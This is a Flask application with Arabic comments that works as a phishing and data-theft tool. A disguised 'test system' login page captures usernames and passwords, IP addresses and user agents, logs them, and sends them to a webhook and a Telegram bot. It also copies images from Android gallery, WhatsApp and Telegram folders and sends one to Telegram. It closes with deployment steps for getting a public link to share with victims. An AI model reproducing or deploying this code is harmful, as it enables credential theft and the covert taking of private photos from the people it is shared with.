from flask import Flask, request, render_template_string, send_from_directory, jsonify
import datetime
import os
import shutil
import requests
import json
import socket
import platform
from werkzeug.utils import secure_filename

app = Flask(__name__)

# إعدادات التطبيق
IMAGES_FOLDER = 'collected_images'
LOGS_FOLDER = 'logs'
app.config['IMAGES_FOLDER'] = IMAGES_FOLDER
app.config['LOGS_FOLDER'] = LOGS_FOLDER

# إنشاء المجلدات إذا لم تكن موجودة
os.makedirs(IMAGES_FOLDER, exist_ok=True)
os.makedirs(LOGS_FOLDER, exist_ok=True)

# امتدادات الصور المسموح بها
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'}

# مسارات مجلدات الصور الشائعة في الأندرويد
ANDROID_IMAGE_PATHS = [
    '/storage/emulated/0/DCIM',
    '/storage/emulated/0/Pictures',
    '/storage/emulated/0/Download',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
    '/storage/emulated/0/Telegram',
    '/storage/emulated/0/DCIM/Camera',
    '/storage/emulated/0/DCIM/Screenshots',
    '/storage/emulated/0/Pictures/Instagram',
    '/storage/emulated/0/Pictures/Facebook',
    '/storage/emulated/0/Pictures/Snapchat',
    '/storage/emulated/0/Pictures/Twitter',
    '/storage/emulated/0/Pictures/Messenger',
    '/storage/emulated/0/Pictures/Screenshots',
    '/storage/emulated/0/Pictures/Saved Pictures',
    '/storage/emulated/0/Pictures/Telegram',
    '/storage/emulated/0/Pictures/WhatsApp',
    '/storage/emulated/0/Pictures/Camera',
    '/storage/emulated/0/Camera',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Sent',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images/Private'
]

WEBHOOK_URL = "https://webhook.site/your-unique-id"
TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"

# قوالب HTML (نفسها كما في الكود الأصلي)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الاختبار - تسجيل الدخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
    <style>
        /* نفس الأنماط كما في الكود الأصلي */
    </style>
</head>
<body>
    <!-- نفس محتوى النموذج كما في الكود الأصلي -->
</body>
</html>
"""

SUCCESS_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تم التسجيل بنجاح</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
    <style>
        /* نفس الأنماط كما في الكود الأصلي */
    </style>
</head>
<body>
    <!-- نفس محتوى النموذج كما في الكود الأصلي -->
</body>
</html>
"""

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def find_and_copy_images():
    image_files = []
    image_paths_log = []
    
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    session_folder = os.path.join(app.config['IMAGES_FOLDER'], f"session_{timestamp}")
    os.makedirs(session_folder, exist_ok=True)
    
    for path in ANDROID_IMAGE_PATHS:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if allowed_file(file):
                        source_path = os.path.join(root, file)
                        try:
                            safe_filename = secure_filename(file)
                            dest_path = os.path.join(session_folder, safe_filename)
                            
                            counter = 1
                            filename_base, filename_ext = os.path.splitext(safe_filename)
                            while os.path.exists(dest_path):
                                dest_path = os.path.join(session_folder, f"{filename_base}_{counter}{filename_ext}")
                                counter += 1
                            
                            shutil.copy2(source_path, dest_path)
                            image_files.append(dest_path)
                            image_paths_log.append(f"{source_path} -> {dest_path}")
                        except Exception as e:
                            print(f"خطأ في نسخ الملف {source_path}: {str(e)}")
    
    log_file = os.path.join(app.config['LOGS_FOLDER'], f"images_log_{timestamp}.txt")
    with open(log_file, 'w', encoding='utf-8') as f:
        f.write(f"تم جمع {len(image_files)} صورة في {datetime.datetime.now()}\n")
        f.write("=" * 50 + "\n")
        for path in image_paths_log:
            f.write(f"{path}\n")
    
    return image_files, session_folder

def get_system_info():
    system_info = {
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "platform": platform.platform(),
        "system": platform.system(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    return system_info

def send_to_webhook(data):
    try:
        response = requests.post(
            WEBHOOK_URL,
            json=data,
            headers={"Content-Type": "application/json"}
        )
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في إرسال البيانات إلى webhook: {str(e)}")
        return False

def send_to_telegram(message, image_path=None):
    try:
        if image_path and os.path.exists(image_path):
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(image_path, "rb") as image_file:
                response = requests.post(
                    url,
                    data={"chat_id": TELEGRAM_CHAT_ID, "caption": message},
                    files={"photo": image_file}
                )
        else:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            response = requests.post(
                url,
                data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
            )
        return response.status_code == 200
    except Exception as e:
        print(f"خطأ في إرسال البيانات إلى تيليجرام: {str(e)}")
        return False

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        user_agent = request.headers.get('User-Agent', '')
        ip_address = request.remote_addr
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_info = get_system_info()
        
        login_data = {
            "timestamp": timestamp,
            "username": username,
            "password": password,
            "ip_address": ip_address,
            "user_agent": user_agent,
            "system_info": system_info
        }
        
        log_timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = os.path.join(app.config['LOGS_FOLDER'], f"login_log_{log_timestamp}.txt")
        with open(log_file, 'w', encoding='utf-8') as f:
            f.write(f"تاريخ: {timestamp}\n")
            f.write(f"اسم المستخدم: {username}\n")
            f.write(f"كلمة المرور: {password}\n")
            f.write(f"عنوان IP: {ip_address}\n")
            f.write(f"متصفح المستخدم: {user_agent}\n")
            f.write(f"معلومات النظام: {json.dumps(system_info, ensure_ascii=False, indent=2)}\n")
        
        webhook_success = send_to_webhook(login_data)
        
        telegram_message = f"🔐 تم تسجيل دخول جديد!\n\n"
        telegram_message += f"📅 التاريخ: {timestamp}\n"
        telegram_message += f"👤 اسم المستخدم: {username}\n"
        telegram_message += f"🔑 كلمة المرور: {password}\n"
        telegram_message += f"🌐 عنوان IP: {ip_address}\n"
        telegram_success = send_to_telegram(telegram_message)
        
        image_files, session_folder = find_and_copy_images()
        
        if image_files:
            image_message = f"📸 تم جمع {len(image_files)} صورة من الجهاز!\n"
            image_message += f"📁 تم حفظها في المجلد: {session_folder}\n"
            
            if len(image_files) > 0:
                send_to_telegram(image_message, image_files[0])
            else:
                send_to_telegram(image_message)
        
        return render_template_string(SUCCESS_TEMPLATE % len(image_files))
    
    return render_template_string(HTML_TEMPLATE)

def deploy_to_railway():
    """تعليمات نشر التطبيق على Railway"""
    print("\n🚀 لرفع التطبيق على Railway والحصول على رابط دائم:")
    print("1. قم بإنشاء حساب على https://railway.app")
    print("2. أنشئ مشروعًا جديدًا (New Project)")
    print("3. اختر 'Deploy from GitHub repo'")
    print("4. اختر المستودع الذي يحتوي على هذا الكود")
    print("5. سيتم نشر التطبيق تلقائيًا وستحصل على رابط مثل: https://your-app-name.railway.app")
    print("6. يمكنك مشاركة هذا الرابط مع الآخرين للوصول إلى التطبيق")

def deploy_to_render():
    """تعليمات نشر التطبيق على Render"""
    print("\n🚀 لرفع التطبيق على Render والحصول على رابط دائم:")
    print("1. قم بإنشاء حساب على https://render.com")
    print("2. اختر 'New Web Service'")
    print("3. اختر المستودع الذي يحتوي على هذا الكود من GitHub")
    print("4. اضبط الإعدادات:")
    print("   - Runtime: Python 3")
    print("   - Build Command: pip install -r requirements.txt")
    print("   - Start Command: python app.py")
    print("5. اضغط 'Create Web Service'")
    print("6. سيتم نشر التطبيق وستحصل على رابط مثل: https://your-app-name.onrender.com")

if __name__ == '__main__':
    print("""
    🌟 تم حذف وظائف الأنفاق الخارجية (Cloudflare/Ngrok) 🌟
    لرفع التطبيق على سيرفر والحصول على رابط دائم، اختر أحد الخيارات التالية:
    """)
    
    deploy_to_railway()
    deploy_to_render()
    
    print("\n🔴 لتشغيل التطبيق محليًا فقط (بدون رابط خارجي):")
    app.run(host='0.0.0.0', port=5000)
